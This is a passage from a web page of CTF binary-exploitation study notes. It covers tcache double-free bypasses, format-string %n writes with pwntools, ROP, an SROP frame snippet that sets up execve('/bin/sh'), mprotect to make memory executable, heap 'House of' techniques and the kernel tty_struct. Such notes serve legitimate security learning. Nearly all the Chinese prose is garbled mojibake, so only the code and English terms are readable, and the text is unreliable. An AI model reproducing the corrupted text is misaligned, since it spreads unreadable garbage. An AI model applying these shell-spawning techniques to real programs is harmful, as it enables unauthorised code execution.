freeï¼Œé‚£ä¹ˆputæ—¶keyå­—æ®µè¢«è®¾ç½®äº†tcacheï¼Œå°±ä¼šè¿›å…¥å¾ªç¯è¢«æ£€æŸ¥å‡ºæ¥</span><br><span class="hljs-comment">    å¦‚æœä¸æ˜¯ï¼Œé‚£ä¹ˆkeyå­—æ®µå°±æ˜¯ç”¨æˆ·æ•°æ®åŒºåŸŸï¼Œå¯ä»¥è§†ä¸ºéšæœºçš„ï¼Œåªæœ‰1/(2^size_t)çš„å¯èƒ½è¡Œè¿›å…¥å¾ªç¯ï¼Œç„¶åå¾ªç¯å‘ç°å¹¶ä¸æ˜¯double free</span><br><span class="hljs-comment">  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache))<span class="hljs-comment">//å‰ªæ</span><br>  &#123;<br>    tcache_entry *tmp;<br>    LIBC_PROBE(memory_tcache_double_free, <span class="hljs-number">2</span>, e, tc_idx);<br>    <span class="hljs-keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)<br>      <span class="hljs-keyword">if</span> (tmp == e)<br>        malloc_printerr(<span class="hljs-string">&quot;free(): double free detected in tcache 2&quot;</span>);<br>  &#125;<br> <br>  <span class="hljs-keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="hljs-comment">//é€šè¿‡æ£€æŸ¥ï¼Œæ”¾å…¥tcahceä¸­</span><br>  &#123;<br>    tcache_put(p, tc_idx);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸¤ç§æ–¹æ³•ç»•è¿‡</p><ol><li>æƒ³åŠæ³•ä¿®æ”¹keyå­—æ®µï¼Œèƒ½ç¼–è¾‘freeåçš„å †å°±å¯ä»¥ï¼ˆå¥½åƒğŸ¥ºï¼‰</li><li>ä½¿ç”¨fastbin double free</li></ol><h4 id="Format-String">Format String</h4><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„æˆå› åœ¨äºåƒprintf/sprintf/snprintfç­‰æ ¼å¼åŒ–æ‰“å°å‡½æ•°éƒ½æ˜¯æ¥å—å¯å˜å‚æ•°çš„ï¼Œè€Œä¸€æ—¦ç¨‹åºç¼–å†™ä¸è§„èŒƒï¼Œæ¯”å¦‚æ­£ç¡®çš„å†™æ³•æ˜¯ï¼š<code>printf(&quot;%s&quot;, pad)</code>ï¼Œå·æ‡’å†™æˆäº†ï¼š<code>printf(pad)</code>ï¼Œæ­¤æ—¶å°±å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p><p><strong>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æœ€ç»ˆå¯ä»¥åšåˆ°ä»»æ„åœ°å€è¯»/å†™</strong></p><p>æˆ‘ä»¬ä¸€èˆ¬ä¼šåˆ†ä¸¤å¤§æ­¥å®ç°æ¼æ´åˆ©ç”¨ï¼š</p><ul><li>ç¬¬ä¸€æ­¥æ„é€ ä¸€ä¸ªpayloadæ¥å¯»æ‰¾è¾“å…¥å­—ç¬¦ä¸²åˆ°æ ˆé¡¶æŒ‡é’ˆçš„åç§»ï¼›</li><li>ç¬¬äºŒæ­¥å°±æ˜¯æ”»å‡»äº†ï¼Œåˆ©ç”¨æ‰¾åˆ°çš„åç§»ï¼Œåœ¨åç§»å¤„å¡«å…¥ç›®çš„åœ°å€å¯ä»¥å®ç°ç›®çš„åœ°å€çš„å†…å®¹æ³„éœ²ä»¥åŠå†…å®¹æ”¹å†™ã€‚</li></ul><p><strong>å¸¸ç”¨åŸºæœ¬çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å‚æ•°ä»‹ç»ï¼š</strong></p><ul><li><p>%cï¼šè¾“å‡ºå­—ç¬¦ï¼Œé…ä¸Š%n å¯ç”¨äºå‘æŒ‡å®šåœ°å€å†™æ•°æ®ã€‚</p></li><li><p>%dï¼šè¾“å‡ºåè¿›åˆ¶æ•´æ•°ï¼Œé…ä¸Š%n å¯ç”¨äºå‘æŒ‡å®šåœ°å€å†™æ•°æ®ã€‚</p></li><li><p>%xï¼šè¾“å‡º 16 è¿›åˆ¶æ•°æ®ï¼Œå¦‚%i$x è¡¨ç¤ºè¦æ³„æ¼åç§» i å¤„ 4 å­—èŠ‚é•¿çš„ 16 è¿›åˆ¶æ•° æ®ï¼Œ</p></li><li><p>%i$lx è¡¨ç¤ºè¦æ³„æ¼åç§» i å¤„ 8 å­—èŠ‚é•¿çš„ 16 è¿›åˆ¶æ•°æ®ï¼Œ32bit å’Œ 64bit ç¯å¢ƒä¸‹ä¸€ æ ·ã€‚</p></li><li><p>%pï¼šè¾“å‡º 16 è¿›åˆ¶æ•°æ®ï¼Œä¸%x åŸºæœ¬ä¸€æ ·ï¼Œåªæ˜¯é™„åŠ äº†å‰ç¼€ 0xï¼Œåœ¨ 32bit ä¸‹è¾“ å‡º 4 å­—èŠ‚ï¼Œåœ¨ 64bit ä¸‹è¾“å‡º 8 å­—èŠ‚ï¼Œå¯é€šè¿‡è¾“å‡ºå­—èŠ‚çš„é•¿åº¦æ¥åˆ¤æ–­ç›®æ ‡ç¯å¢ƒæ˜¯ 32bit è¿˜æ˜¯ 64bitã€‚</p></li><li><p>%sï¼šè¾“å‡ºçš„å†…å®¹æ˜¯å­—ç¬¦ä¸²ï¼Œå³å°†åç§»å¤„æŒ‡é’ˆæŒ‡å‘çš„å­—ç¬¦ä¸²è¾“å‡ºï¼Œå¦‚%i$s è¡¨ç¤º è¾“å‡ºåç§» i å¤„åœ°å€æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œåœ¨ 32bit å’Œ 64bit ç¯å¢ƒä¸‹ä¸€æ ·ï¼Œå¯ç”¨äºè¯»å– GOT è¡¨ç­‰ä¿¡æ¯ã€‚</p></li><li><p>%nï¼šå°†%n ä¹‹å‰ printf å·²ç»æ‰“å°çš„å­—ç¬¦ä¸ªæ•°èµ‹å€¼ç»™åç§»å¤„æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€ ä½ç½®ï¼Œå¦‚%100Ã—10$n è¡¨ç¤ºå°† 0x64 å†™å…¥åç§» 10 å¤„ä¿å­˜çš„æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€ï¼ˆ4 å­—èŠ‚ï¼‰ï¼Œè€Œ%$hn è¡¨ç¤ºå†™å…¥çš„åœ°å€ç©ºé—´ä¸º 2 å­—èŠ‚ï¼Œ%$hhn è¡¨ç¤ºå†™å…¥çš„åœ°å€ç©ºé—´ä¸º 1 å­—èŠ‚ï¼Œ%$lln è¡¨ç¤ºå†™å…¥çš„åœ°å€ç©ºé—´ä¸º 8 å­—èŠ‚ï¼Œåœ¨ 32bit å’Œ 64bit ç¯å¢ƒä¸‹ä¸€æ ·ã€‚æœ‰æ—¶ï¼Œ ç›´æ¥å†™ 4 å­—èŠ‚ä¼šå¯¼è‡´ç¨‹åºå´©æºƒæˆ–ç­‰å€™æ—¶é—´è¿‡é•¿ï¼Œå¯ä»¥é€šè¿‡%$hn æˆ–%$hhn æ¥é€‚æ—¶ è°ƒæ•´ã€‚</p></li><li><p>%n æ˜¯é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ”¹å˜ç¨‹åºæµç¨‹çš„å…³é”®æ–¹å¼ï¼Œè€Œå…¶ä»–æ ¼å¼åŒ–å­—ç¬¦ ä¸²å‚æ•°å¯ç”¨äºè¯»å–ä¿¡æ¯æˆ–é…åˆ%n å†™æ•°æ®ã€‚</p></li></ul><p>32ä½/64ä½ä¸‹ç•¥æœ‰å·®å¼‚</p><p>32ä½æˆ‘è®°å¾—pwntoolsèƒ½å¾ˆæ–¹ä¾¿çš„ä½¿ç”¨</p><blockquote><p>fmtstr_payloadæ˜¯pwntoolsé‡Œé¢çš„ä¸€ä¸ªå·¥å…·ï¼Œç”¨æ¥ç®€åŒ–å¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„æ„é€ å·¥ä½œã€‚</p><p>fmtstr_payload(offset, writes, numbwritten=0, write_size=â€˜byteâ€™)</p><p>ç¬¬ä¸€ä¸ªå‚æ•°è¡¨ç¤ºæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»ï¼›</p><p>ç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºéœ€è¦åˆ©ç”¨%nå†™å…¥çš„æ•°æ®ï¼Œé‡‡ç”¨å­—å…¸å½¢å¼ï¼Œæˆ‘ä»¬è¦å°†printfçš„GOTæ•°æ®æ”¹ä¸ºsystemå‡½æ•°åœ°å€ï¼Œå°±å†™æˆ{printfGOT: systemAddress}ï¼›æœ¬é¢˜æ˜¯å°†0804a048å¤„æ”¹ä¸º0x2223322</p><p>ç¬¬ä¸‰ä¸ªå‚æ•°è¡¨ç¤ºå·²ç»è¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°ï¼Œè¿™é‡Œæ²¡æœ‰ï¼Œä¸º0ï¼Œé‡‡ç”¨é»˜è®¤å€¼å³å¯ï¼›</p><p>ç¬¬å››ä¸ªå‚æ•°è¡¨ç¤ºå†™å…¥æ–¹å¼ï¼Œæ˜¯æŒ‰å­—èŠ‚ï¼ˆbyteï¼‰ã€æŒ‰åŒå­—èŠ‚ï¼ˆshortï¼‰è¿˜æ˜¯æŒ‰å››å­—èŠ‚ï¼ˆintï¼‰ï¼Œå¯¹åº”ç€hhnã€hnå’Œnï¼Œé»˜è®¤å€¼æ˜¯byteï¼Œå³æŒ‰hhnå†™ã€‚ fmtstr_payloadå‡½æ•°è¿”å›çš„å°±æ˜¯payload</p><p>å®é™…ä¸Šæˆ‘ä»¬å¸¸ç”¨çš„å½¢å¼æ˜¯fmtstr_payload(offset,{address1:value1})</p></blockquote><p>64ä½ä¸‹è¦è¾¾æˆè¿™æ ·å†™èµ·æ¥è¿˜æ˜¯æŒºéº»çƒ¦çš„ï¼Œè¦åœ°å€æ‹†æˆä¸¤éƒ¨åˆ†ï¼Œè¿˜è¦é˜²æ­¢æˆªæ–­ï¼ˆé‚£äº›è¾“å…¥å‡½æ•°ä¸€èˆ¬éƒ½æœ‰/x00æˆªæ–­ï¼‰</p><h4 id="Integer-Overflow">Integer Overflow</h4><h4 id="Type-Confusion">Type Confusion</h4><p>ç±»å‹æ··æ·†ï¼Œå¥½åƒæ˜¯C++æ‰æœ‰çš„æ¼æ´ç±»å‹ï¼Œæˆ‘ä¸æ‡‚</p><h4 id="Race-Condition">Race Condition</h4><h3 id="Stack-Exploitation">Stack Exploitation</h3><h4 id="ROP">ROP</h4><p>å³è¿”å›å¯¼å‘ç¼–ç¨‹ï¼ˆReturn Qriented Prorammingï¼‰</p><p>é€šè¿‡ä¸æ–­å»æ‰§è¡ŒåŒ…å«retçš„ç¨‹åºç‰‡æ®µæ¥è¾¾åˆ°æƒ³è¦çš„æ“ä½œ</p><p>è¿™äº›åŒ…å«retçš„ç¨‹å¼ç‰‡æ®µåˆè¢«ç§°ä½œgadget</p><p>ä¾‹:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">4004fa:48 83 c4 08       add    rsp,0x8<br>4004fe:5d                ret<br></code></pre></td></tr></table></figure><h4 id="SROP">SROP</h4><p>SROPçš„å…¨ç§°æ˜¯Sigreturn Oriented Programmingã€‚åœ¨è¿™é‡Œ<code>sigreturn</code>æ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œå®ƒåœ¨unixç³»ç»Ÿå‘ç”Ÿsignalçš„æ—¶å€™ä¼šè¢«é—´æ¥åœ°è°ƒç”¨ã€‚</p><p>pwntoolsæœ‰SigreturnFrame()å¯ä»¥å¿«é€Ÿç¼–å†™payload</p><p>ä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">frame = SigreturnFrame()<br>frame.rax=constants.SYS_execve<br>frame.rdi=binsh_addr<br>frame.rsi=<span class="hljs-number">0</span><br>frame.rdx=<span class="hljs-number">0</span><br>frame.rip=system_call<br></code></pre></td></tr></table></figure><p>å½“å†…æ ¸å‘æŸä¸ªè¿›ç¨‹å‘é€ä¸€ä¸ªsignalï¼Œè¯¥è¿›ç¨‹ä¼šè¢«æš‚æ—¶æŒ‚èµ·ï¼Œè¿›å…¥å†…æ ¸æ€ï¼Œ</p><p>ç„¶åå†…æ ¸ä¸ºè¯¥è¿›ç¨‹ä¿å­˜ç›¸åº”çš„ä¸Šä¸‹æ–‡ï¼Œè·³è½¬åˆ°ä¹‹å‰æ³¨å†Œå¥½çš„signal handlerä¸­å¤„ç†ç›¸åº”signalã€‚å†…æ ¸ä¼šå¸®ç”¨æˆ·è¿›ç¨‹å°†å…¶ä¸Šä¸‹æ–‡ä¿å­˜åœ¨è¯¥è¿›ç¨‹çš„æ ˆä¸Šï¼Œç„¶ååœ¨æ ˆé¡¶å¡«ä¸Šä¸€ä¸ªåœ°å€<code>rt_sigreturn</code>ï¼Œè¿™ä¸ªåœ°å€æŒ‡å‘ä¸€æ®µä»£ç ï¼Œåœ¨è¿™æ®µä»£ç ä¸­ä¼šè°ƒç”¨<code>sigreturn</code>ç³»ç»Ÿè°ƒç”¨ã€‚å› æ­¤ï¼Œå½“signal handleræ‰§è¡Œå®Œä¹‹åï¼Œæ ˆæŒ‡é’ˆï¼ˆstack pointerï¼‰å°±æŒ‡å‘<code>rt_sigreturn</code>ï¼Œæ‰€ä»¥ï¼Œsignal handlerå‡½æ•°çš„æœ€åä¸€æ¡<code>ret</code>æŒ‡ä»¤ä¼šä½¿å¾—æ‰§è¡Œæµè·³è½¬åˆ°è¿™æ®µsigreturnä»£ç ï¼Œè¢«åŠ¨åœ°è¿›è¡Œ<code>sigreturn</code>ç³»ç»Ÿè°ƒç”¨ã€‚</p><p>å½“signal handlerè¿”å›ä¹‹åå†…æ ¸ä¸ºè¯¥è¿›ç¨‹æ¢å¤ä¹‹å‰ä¿å­˜çš„ä¸Šä¸‹æ–‡ï¼Œæœ€åæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œ</p><p>ç¬¬ä¸€ã€è¿™ä¸ª<code>Signal Frame</code>æ˜¯è¢«ä¿å­˜åœ¨ç”¨æˆ·è¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­çš„ï¼Œæ˜¯ç”¨æˆ·è¿›ç¨‹å¯è¯»å†™çš„ï¼›</p><p>ç¬¬äºŒã€å†…æ ¸å¹¶æ²¡æœ‰å°†ä¿å­˜çš„è¿‡ç¨‹å’Œæ¢å¤çš„è¿‡ç¨‹è¿›è¡Œä¸€ä¸ªæ¯”è¾ƒï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨<code>sigreturn</code>è¿™ä¸ªç³»ç»Ÿè°ƒç”¨çš„å¤„ç†å‡½æ•°ä¸­ï¼Œå†…æ ¸å¹¶æ²¡æœ‰åˆ¤æ–­å½“å‰çš„è¿™ä¸ª<code>Signal Frame</code>å°±æ˜¯ä¹‹å‰å†…æ ¸ä¸ºç”¨æˆ·è¿›ç¨‹ä¿å­˜çš„é‚£ä¸ª<code>Signal Frame</code>ã€‚</p><p><strong>ä¾‹</strong>ï¼šå‡è®¾ä¸€ä¸ªæ”»å‡»è€…å¯ä»¥æ§åˆ¶ç”¨æˆ·è¿›ç¨‹çš„æ ˆï¼Œé‚£ä¹ˆå®ƒå°±å¯ä»¥ä¼ªé€ ä¸€ä¸ª<code>Signal Frame</code></p><p>åœ¨è¿™ä¸ªä¼ªé€ çš„<code>Signal Frame</code>ä¸­ï¼Œå°†<code>rax</code>è®¾ç½®æˆ59ï¼ˆå³<code>execve</code>ç³»ç»Ÿè°ƒç”¨å·ï¼‰ï¼Œå°†<code>rdi</code>è®¾ç½®æˆå­—ç¬¦ä¸²<code>/bin/sh</code>çš„åœ°å€ï¼ˆè¯¥å­—ç¬¦ä¸²å¯ä»¥æ˜¯æ”»å‡»è€…å†™åœ¨æ ˆä¸Šçš„ï¼‰ï¼Œå°†<code>rip</code>è®¾ç½®æˆç³»ç»Ÿè°ƒç”¨æŒ‡ä»¤<code>syscall</code>çš„å†…å­˜åœ°å€ï¼Œæœ€åï¼Œå°†<code>rt_sigreturn</code>æ‰‹åŠ¨è®¾ç½®æˆ<code>sigreturn</code>ç³»ç»Ÿè°ƒç”¨çš„å†…å­˜åœ°å€ã€‚é‚£ä¹ˆï¼Œå½“è¿™ä¸ªä¼ªé€ çš„<code>sigreturn</code>ç³»ç»Ÿè°ƒç”¨è¿”å›ä¹‹åï¼Œç›¸åº”çš„å¯„å­˜å™¨å°±è¢«è®¾ç½®æˆäº†æ”»å‡»è€…å¯ä»¥æ§åˆ¶çš„å€¼ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œä¸€æ—¦<code>sigreturn</code>è¿”å›ï¼Œå°±ä¼šå»æ‰§è¡Œ<code>execve</code>ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰“å¼€ä¸€ä¸ªshellã€‚</p><p><strong>æ€»ä½“æ¥è¯´ï¼š</strong></p><p>å°±æ˜¯åœ¨æ ˆä¸Šä¼ªé€ fake_SigreturnFrameï¼Œæˆ‘ä»¬åˆ©ç”¨sigreturnçš„æœºåˆ¶ï¼Œåœ¨è¿”å›æ—¶å¸¦å‚æ•°çš„æ‰§è¡ŒæŸä¸ªç³»ç»Ÿè°ƒç”¨</p><h4 id="Stack-migration">Stack migration</h4><p>æº¢å‡ºé•¿åº¦ä¸å¤Ÿæ—¶</p><h4 id="ret2shellcode">ret2shellcode</h4><h4 id="ret2libc">ret2libc</h4><h4 id="ret2csu">ret2csu</h4><h4 id="ret2dl-resolve">ret2dl_resolve</h4><h4 id="å¸¸ç”¨çš„ç³»ç»Ÿè°ƒç”¨">å¸¸ç”¨çš„ç³»ç»Ÿè°ƒç”¨</h4><h5 id="system">system</h5><p>ä¸€èˆ¬ropå‡ºsystem(â€œ/bin/sh\x00â€)</p><p>64ä½ä¸€èˆ¬ç”¨syscallçš„è¯ï¼Œè¦æ§åˆ¶</p><p>rax=59</p><p>rdi=â€œ/bin/sh\x00â€å­—ç¬¦ä¸²çš„åœ°å€</p><h5 id="execve">execve</h5><p>one_gadgetæ‰¾å‡ºæ¥çš„ä¹Ÿæ˜¯è¿™ä¸ªç³»ç»Ÿè°ƒç”¨</p><h5 id="open-read-write">open/read/write</h5><p>å¼€å¯æ²™ç›’æ—¶banäº†æŸäº›ç³»ç»Ÿè°ƒç”¨ï¼Œæ— æ³•è¾¾æˆgetshellæ—¶é€€è€Œæ±‚å…¶æ¬¡ï¼Œè¦ä½ é‡‡å–orwçš„æ–¹å¼cat flag</p><p>æœ‰æ—¶pwné¢˜ä¼šç»™æ›´ä¸¥æ ¼é™åˆ¶ä»…ç»™ä½ ä½¿ç”¨è¿™ä¸‰è€…ä¸­çš„ä¸¤ä¸ªæ¥cat flag</p><h5 id="mprotect">mprotect</h5><p>int mprotect(const void *start, size_t len, int prot)</p><p>å¯ä»¥ç”¨äºç»™æŸæ®µåœ°å€æå‡æƒé™ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œï¼ˆrwxï¼‰</p><p>åªéœ€è¦protå‚æ•°ç­‰äº7(111B)</p><p>startå¿…é¡»æ˜¯ä¸€ä¸ªå†…å­˜é¡µçš„èµ·å§‹åœ°å€ï¼Œå¹¶ä¸”åŒºé—´é•¿åº¦lenå¿…é¡»æ˜¯é¡µå¤§å°çš„æ•´æ•°å€ã€‚</p><p>ä¸ç„¶ä¼šè°ƒç”¨å¤±è´¥</p><h3 id="Heap-Exploitation">Heap Exploitation</h3><p>ä¸‹é¢çš„å †åˆ©ç”¨æ‰‹æ³•éƒ½æ˜¯åŸºäºptmalloc2</p><p>ä¸€èˆ¬ç»™æ¼æ´åƒï¼Œå †æº¢å‡ºï¼Œoff-by-oneï¼Œoff-by-nullï¼Œæˆ–è€…uafï¼Œçœ‹ä½ æ€ä¹ˆåˆ©ç”¨äº†</p><h4 id="Chunk-Extend-and-Overlapping">Chunk Extend and Overlapping</h4><p>ç†ŸçŸ¥å †ç»“æ„çš„å‰æä¸‹ï¼Œè¿ç”¨å †é£æ°´æŠ€å·§ä¼ªé€ å †å—</p><h4 id="Unlink">Unlink</h4><h4 id="Fastbin-Attack">Fastbin Attack</h4><h4 id="Unsorted-Bin-Attack">Unsorted Bin Attack</h4><h4 id="Large-Bin-Attack">Large Bin Attack</h4><p>é«˜ç‰ˆæœ¬å¯ä»¥è¯´è¿™ä¸ªæ˜¯å¤§æ”¾å¼‚å½©</p><h4 id="Tcache-attack">Tcache attack</h4><h4 id="Tcache-Stashing-Unlink-Attack">Tcache-Stashing-Unlink-Attack</h4><h4 id="House">House</h4><h5 id="House-Of-Force">House Of Force</h5><h5 id="House-of-Orange">House of Orange</h5><h5 id="House-of-Roman">House of Roman</h5><p>fastbin attack å’Œ Unsortbin attack ç»“åˆçš„ä¸€ä¸ªå° trickã€‚</p><h5 id="House-of-Pig">House of Pig</h5><h5 id="House-of-banana">House of banana</h5><h5 id="House-of-Corrosion">House of Corrosion</h5><h5 id="House-of-emma">House of emma</h5><h5 id="House-of-apple">House of apple</h5><h3 id="IO-FILE-Exploitation">IO_FILE Exploitation</h3><h2 id="Kernel-Mode">Kernel Mode</h2><h3 id="å¸¸ç”¨ç»“æ„ä½“">å¸¸ç”¨ç»“æ„ä½“</h3><h4 id="TTY">TTY</h4><h5 id="åˆ›å»ºç»“æ„">åˆ›å»ºç»“æ„</h5><p>æ‰“å¼€è®¾å¤‡/dev/ptmxæ—¶</p><p><strong>open(â€œ/dev/ptmxâ€,O_RDWR)</strong></p><h6 id="tty-struct">tty_struct</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span><br><span class="hljs-comment">//magic =0x5401</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> &#123;</span>  <br>    <span class="hljs-type">int</span> magic;  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kref</span> <span class="hljs-title">kref</span>;</span>  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> *<span class="hljs-title">dev</span>;</span>  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>;</span>  <br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> *<span class="hljs-title">ops</span>;</span>  <br>    <span class="hljs-type">int</span> index;  <br>    <span class="hljs-comment">/* Protects ldisc changes: Lock tty not pty */</span>  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ld_semaphore</span> <span class="hljs-title">ldisc_sem</span>;</span>  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_ldisc</span> *<span class="hljs-title">ldisc</span>;</span>  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">atomic_write_lock</span>;</span>  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">legacy_mutex</span>;</span>  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">throttle_mutex</span>;</span>  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rw_semaphore</span> <span class="hljs-title">termios_rwsem</span>;</span>  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">winsize_mutex</span>;</span>  <br>    <span class="hljs-type">spinlock_t</span> ctrl_lock;  <br>    <span class="hljs-type">spinlock_t</span> flow_lock;  <br>    <span class="hljs-comment">/* Termios values are protected by the termios rwsem */</span>  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ktermios</span> <span class="hljs-title">termios</span>, <span class="hljs-title">termios_locked</span>;</span>  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">termiox</span> *<span class="hljs-title">termiox</span>;</span>    <span class="hljs-comment">/* May be NULL for unsupported */</span>  <br>    <span class="hljs-type">char</span> name[<span class="hljs-number">64</span>];  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">pgrp</span>;</span>       <span class="hljs-comment">/* Protected by ctrl lock */</span>  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">session</span>;</span>  <br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;  <br>    <span class="hljs-type">int</span> count;  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">winsize</span> <span class="hljs-title">winsize</span>;</span>     <span class="hljs-comment">/* winsize_mutex */</span>  <br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stopped:<span class="hljs-number">1</span>,    <span class="hljs-comment">/* flow_lock */</span>  <br>              flow_stopped:<span class="hljs-number">1</span>,  <br>              unused:BITS_PER_LONG - <span class="hljs-number">2</span>;  <br>    <span class="hljs-type">int</span> hw_stopped;  <br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ctrl_status:<span class="hljs-number">8</span>,    <span class="hljs-comment">/* ctrl_lock */</span>  <br>              packet:<span class="hljs-number">1</span>,  <br>              unused_ctrl:BITS_PER_LONG - <span class="hljs-number">9</span>;  <br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> receive_room;  <span class="hljs-comment">/* Bytes free for queue */</span>  <br>    <span class="hljs-type">int</span> flow_change;  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> *<span class="hljs-title">link</span>;</span>  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync</span>;</span>  <br>    <span class="hljs-type">wait_queue_head_t</span> write_wait;  <br>    <span class="hljs-type">wait_queue_head_t</span> read_wait;  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span> <span class="hljs-title">hangup_work</span>;</span>  <br>    <span class="hljs-type">void</span> *disc_data;  <br>    <span class="hljs-type">void</span> *driver_data;  <br>    <span class="hljs-type">spinlock_t</span> files_lock;      <span class="hljs-comment">/* protects tty_files list */</span>  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">tty_files</span>;</span>  <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N_TTY_BUF_SIZE 4096  </span><br>    <span class="hljs-type">int</span> closing;  <br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *write_buf;  <br>    <span class="hljs-type">int</span> write_cnt;  <br>    <span class="hljs-comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span>  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span> <span class="hljs-title">SAK_work</span>;</span>  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_port</span> *<span class="hljs-title">port</span>;</span>  <br>&#125; __randomize_layout;  <br></code></pre></td></tr></table></figure><h6 id="tty-ops">tty_ops</h6><p><code>tty_struct</code>ä¸­çš„<code>const struct tty_operations *ops;</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 